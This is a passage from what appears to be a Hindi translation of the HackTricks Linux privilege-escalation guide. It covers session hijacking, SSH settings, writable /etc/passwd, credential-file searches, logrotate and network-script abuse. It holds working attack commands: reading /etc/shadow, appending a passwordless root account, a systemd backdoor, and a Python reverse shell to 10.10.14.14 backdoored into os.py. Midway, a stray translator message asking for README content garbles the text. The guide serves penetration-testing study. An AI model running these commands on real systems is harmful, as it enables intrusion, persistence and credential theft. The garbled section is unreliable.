**दें** उपयोगकर्ता "kali" को किसी फ़ाइल पर पढ़ने और लिखने की अनुमतियाँ:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## खुले shell sessions

**पुराने संस्करणों** में आप किसी दूसरे उपयोगकर्ता (**root**) के कुछ **shell** session को **hijack** कर सकते हैं.\
**नवीनतम संस्करणों** में आप केवल **अपने उपयोगकर्ता** के screen sessions से ही **connect** कर पाएँगे। हालांकि, आप **session के अंदर रोचक जानकारी** पा सकते हैं।

### screen sessions hijacking

**screen sessions सूचीबद्ध करें**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**session से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह समस्या **पुराने tmux संस्करणों** के साथ थी। मैं root द्वारा बनाए गए tmux (v2.1) session को एक non-privileged user के रूप में hijack नहीं कर पाया।

**tmux sessions की सूची**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**एक session से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
यह बग उन OS पर नए ssh key बनाने के समय होता है, क्योंकि **केवल 32,768 variations संभव थे**। इसका मतलब है कि सभी संभावनाओं की गणना की जा सकती है और **ssh public key होने पर आप संबंधित private key खोज सकते हैं**। आप गणितीय संभावनाएँ यहाँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** यह बताता है कि पासवर्ड authentication की अनुमति है या नहीं। डिफ़ॉल्ट मान `no` है।
- **PubkeyAuthentication:** यह बताता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट मान `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, यह निर्दिष्ट करता है कि सर्वर खाली password स्ट्रिंग वाले अकाउंट्स में लॉगिन की अनुमति देता है या नहीं। डिफ़ॉल्ट मान `no` है।

### PermitRootLogin

यह निर्दिष्ट करता है कि root ssh के माध्यम से लॉग इन कर सकता है या नहीं, डिफ़ॉल्ट `no` है। संभावित मान:

- `yes`: root पासवर्ड और private key दोनों से लॉगिन कर सकता है
- `without-password` or `prohibit-password`: root केवल private key से ही लॉगिन कर सकता है
- `forced-commands-only`: root केवल private key का उपयोग करके और तभी लॉगिन कर सकता है जब commands विकल्प निर्दिष्ट हों
- `no` : नहीं

### AuthorizedKeysFile

यह उन फ़ाइलों को निर्दिष्ट करता है जिनमें वे public keys होते हैं जिन्हें user authentication के लिए उपयोग किया जा सकता है। इसमें `%h` जैसे tokens हो सकते हैं, जिन्हें home directory से बदला जाएगा। **आप absolute paths निर्दिष्ट कर सकते हैं** (जो `/` से शुरू होते हैं) या **user के home से relative paths**। For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
यह configuration संकेत करेगा कि यदि आप उपयोगकर्ता "**testusername**" की **private** key से लॉगिन करने का प्रयास करते हैं, तो ssh आपकी key का public key `/home/testusername/.ssh/authorized_keys` और `/home/testusername/access` में मौजूद keys से तुलना करेगा।

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको यह अनुमति देता है कि आप अपने सर्वर पर keys (बिना passphrases!) छोड़कर रखने की बजाय **use your local SSH keys instead of leaving keys**. इस तरह आप ssh के माध्यम से **jump** **to a host** कर पाएँगे और वहाँ से किसी दूसरे host पर **jump to another** करते हुए अपने **initial host** में मौजूद **key** का **using** कर सकेंगे।

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है, तो हर बार जब उपयोगकर्ता किसी अलग मशीन पर कूदता है, वह host कीज़ तक पहुँच पाएगा (जो एक सुरक्षा समस्या है)।

फ़ाइल `/etc/ssh_config` इस **विकल्प** को **ओवरराइड** कर सकती है और इस कॉन्फ़िगरेशन को अनुमति दे सकती है या अस्वीकार कर सकती है.\
फ़ाइल `/etc/sshd_config` `AllowAgentForwarding` कीवर्ड के साथ ssh-agent forwarding को **अनुमति** दे सकती है या **निरस्त** कर सकती है (डिफ़ॉल्ट अनुमति है)।

यदि आप पाते हैं कि Forward Agent किसी environment में कॉन्फ़िगर है तो निम्न पृष्ठ पढ़ें क्योंकि **आप संभवतः इसका दुरुपयोग करके escalate privileges कर सकते हैं**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## रोचक फाइलें

### प्रोफ़ाइल फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंतर्गत फ़ाइलें **स्क्रिप्ट्स जो तब execute होती हैं जब कोई उपयोगकर्ता नया shell चलाता है**। इसलिए, यदि आप उनमें से किसी को भी **लिख या संशोधित कर सकते हैं तो आप escalate privileges कर सकते हैं**।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile script मिलती है तो आपको इसे **संवेदनशील जानकारी** के लिए जांचना चाहिए।

### Passwd/Shadow फ़ाइलें

OS के अनुसार `/etc/passwd` और `/etc/shadow` फाइलें अलग नाम से हो सकती हैं या उनकी कोई बैकअप मौजूद हो सकती है। इसलिए यह सुझाया जाता है कि आप **सभी को ढूंढें** और **जाँचें कि क्या आप उन्हें पढ़ सकते हैं** ताकि यह देखा जा सके कि फाइलों के अंदर **hashes हैं या नहीं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ मौकों पर आप **password hashes** को `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर पा सकते हैं।
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

पहले, निम्नलिखित कमांड्स में से किसी एक के साथ एक password जनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
मुझे फाइल src/linux-hardening/privilege-escalation/README.md की सामग्री चाहिए ताकि मैं इसे निर्दिष्ट नियमों के अनुसार हिंदी में अनुवाद कर सकूँ और फिर उस अनुवादित टेक्स्ट में `hacker` user और जनरेट किया गया पासवर्ड जोड़ सकूं।

कृपया निम्न बताएं/पेस्ट करें:
- README.md की पूरी सामग्री (या वह हिस्सा जिसे अनुवाद चाहिए)।
- क्या आप चाहेंगे कि जनरेट किया गया पासवर्ड फ़ाइल में कोड फ़ॉर्मेट (backticks) में जोड़ूं? (डिफ़ॉल्ट: हाँ)
- पासवर्ड की लंबाई/जटिलता के लिए कोई प्राथमिकता? (डिफ़ॉल्ट: 16 कैरेक्टर, अक्षर+संख्या+प्रतीक)

जब आप सामग्री दे देंगे, मैं वही Markdown/HTML टैग और paths/लिंक्स अपरिवर्तित रखते हुए शेष अंग्रेज़ी टेक्स्ट का स्पष्ट और संक्षिप्त हिंदी अनुवाद कर दूँगा और अंत में `hacker` user व जनरेट किया गया पासवर्ड जोड़ दूँगा।
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदा: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` कमांड का उपयोग `hacker:hacker` के साथ कर सकते हैं

वैकल्पिक रूप से, आप पासवर्ड के बिना एक डमी उपयोगकर्ता जोड़ने के लिए निम्नलिखित लाइनों का उपयोग कर सकते हैं।\
चेतावनी: इससे मशीन की मौजूदा सुरक्षा कमजोर हो सकती है।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म में `/etc/passwd` का स्थान `/etc/pwd.db` और `/etc/master.passwd` होता है, और `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया गया है।

आपको यह जाँचनी चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सेवा कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, अगर मशीन पर **tomcat** सर्वर चल रहा है और आप **/etc/systemd/ के अंदर Tomcat service configuration file को संशोधित कर सकते हैं,** तो आप निम्न लाइनों को संशोधित कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started.

### फ़ोल्डरों की जांच करें

निम्नलिखित फ़ोल्डरों में बैकअप या उपयोगी जानकारी मिल सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप आखिरी वाले को पढ़ नहीं पाएँगे, लेकिन कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned फ़ाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले कुछ मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH में Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### पासवर्ड रखने वाली ज्ञात फ़ाइलें

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) के कोड को पढ़ें, यह **उन कई संभावित फ़ाइलों** की तलाश करता है जिनमें पासवर्ड हो सकते हैं।\
**एक और दिलचस्प टूल** जिसका आप इसके लिए उपयोग कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक open source application है जो Windows, Linux & Mac पर लोकल कंप्यूटर में संग्रहीत कई पासवर्ड निकालने के लिए प्रयोग होता है।

### लॉग्स

यदि आप लॉग्स पढ़ सकते हैं, तो आप उनमें **दिलचस्प/गोपनीय जानकारी** पा सकते हैं। जितना अजीब लॉग होगा, उतना (शायद) अधिक दिलचस्प होगा।\
इसके अलावा, कुछ **"bad"** कॉन्फ़िगर किए गए (backdoored?) **audit logs** आपको audit logs के अंदर पासवर्ड रिकॉर्ड करने की अनुमति दे सकते हैं जैसा कि इस पोस्ट में बताया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**लॉग पढ़ने के लिए समूह** [**adm**](interesting-groups-linux-pe/index.html#adm-group) बहुत मददगार होगा।

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

You should also check for files containing the word "**password**" in its **नाम** or inside the **सामग्री**, and also check for IPs and emails inside logs, or hashes regexps.\
मैं यहाँ यह सब कैसे करना है सूचीबद्ध नहीं कर रहा, लेकिन अगर आप रुचि रखते हैं तो आप उन अंतिम चेक्स को देख सकते हैं जो [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform करते हैं।

## Writable files

### Python library hijacking

If you know from **कहां से** a python script is going to be executed and you **उस फ़ोल्डर में लिख सकते हैं** or you can **python libraries को modify कर सकते हैं**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

os.py लाइब्रेरी के अंत में निम्नलिखित लाइन जोड़कर **library को backdoor करें** (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` में एक vulnerability ऐसी अनुमति देती है कि जिन उपयोगकर्ताओं के पास किसी लॉग फ़ाइल या उसके parent directories पर **write permissions** हों वे संभावित रूप से escalated privileges हासिल कर सकते हैं। ऐसा इसलिए होता है क्योंकि `logrotate`, जो अक्सर **root** के रूप में चलता है, को मनमाने फ़ाइलों को execute करने के लिए manipulate किया जा सकता है, खासकर उन डायरेक्टरीज़ में जैसे _**/etc/bash_completion.d/**_. केवल _/var/log_ में ही नहीं, बल्कि उन किसी भी डायरेक्टरी में जहाँ log rotation लागू है, permissions चेक करना महत्वपूर्ण है।

> [!TIP]
> यह vulnerability `logrotate` version `3.18.0` और पुराने पर असर डालती है

इस vulnerability के बारे में अधिक विस्तृत जानकारी इस पृष्ठ पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस vulnerability को [**logrotten**](https://github.com/whotwagner/logrotten) से exploit कर सकते हैं।

यह vulnerability [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** के बहुत समान है, इसलिए जब भी आप पाते हैं कि आप logs को बदल सकते हैं, तो यह देखें कि कौन उन logs को manage कर रहा है और देखें कि क्या आप logs को symlinks से बदलकर privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

Vulnerability reference: [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी भी कारण से कोई उपयोगकर्ता _/etc/sysconfig/network-scripts_ में `ifcf-<whatever>` स्क्रिप्ट लिखने में सक्षम है या किसी मौजूदा स्क्रिप्ट को समायोजित कर सकता है, तो आपकी system pwned हो सकती है।

Network scripts, जैसे _ifcg-eth0_, नेटवर्क कनेक्शनों के लिए उपयोग किए जाते हैं। ये बिल्कुल .INI files की तरह दिखते हैं। हालांकि, इन्हें Linux पर Network Manager (dispatcher.d) द्वारा \~sourced\~ किया जाता है।

मेरे केस में, इन network scripts में `NAME=` attribute सही तरीके से handle नहीं होता। अगर नाम में **white/blank space** हो तो system पहले white/blank space के बाद वाले हिस्से को execute करने की कोशिश करता है। इसका मतलब है कि **पहले blank space के बाद का सब कुछ root के रूप में execute होता है**।

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network और /bin/id के बीच रिक्त स्थान को ध्यान में रखें_)

### **init, init.d, systemd, and rc.d**

निर्देशिका `/etc/init.d` System V init (SysVinit) के लिए **scripts** का घर है, जो **classic Linux service management system** है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने के लिए scripts शामिल होते हैं। इन्हें सीधे या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से चलाया जा सकता है। Redhat सिस्टम्स में एक वैकल्पिक पथ `/etc/rc.d/init.d` है।

वहीं दूसरी ओर, `/etc/init` **Upstart** से जुड़ा है, जो Ubuntu द्वारा पेश किया गया नया **service management** है और service management कार्यों के लिए configuration files का उपयोग करता है। Upstart में transition के बावजूद, compatibility layer के कारण SysVinit scripts अभी भी Upstart configurations के साथ उपयोग में रहते हैं।

**systemd** एक आधुनिक initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसी उन्नत सुविधाएँ प्रदान करता है। यह files को वितरण पैकेजों के लिए `/usr/lib/systemd/` और व्यवस्थापक संशोधनों के लिए `/etc/systemd/system/` में व्यवस्थित करता है, जिससे system administration प्रक्रियाओं को सरल किया जाता है।

## अन्य ट्रिक्स

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर privileged kernel functionality को userspace manager को expose करने के लिए एक syscall को hook करते हैं। कमजोर manager authentication (उदा., FD-order पर आधारित signature checks या कमजोर password schemes) एक local app को manager का impersonate करने और पहले से rooted डिवाइसों पर root तक escalate करने में सक्षम बना सकती है। अधिक जानकारी और exploitation विवरण यहाँ देखें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery VMware Tools/Aria Operations में process command lines से एक binary path निकाल सकती है और इसे privileged context में -v के साथ execute कर सकती है। permissive patterns (उदा., \S का उपयोग) writable स्थानों (उदा., /tmp/httpd) में attacker-staged listeners से मिल सकते हैं, जिससे root के रूप में execution हो सकता है (CWE-426 Untrusted Search Path)।

अधिक जानें और अन्य discovery/monitoring stacks पर लागू होने वाले सामान्यीकृत पैटर्न को यहाँ देखें:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## और मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## संदर्भ

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
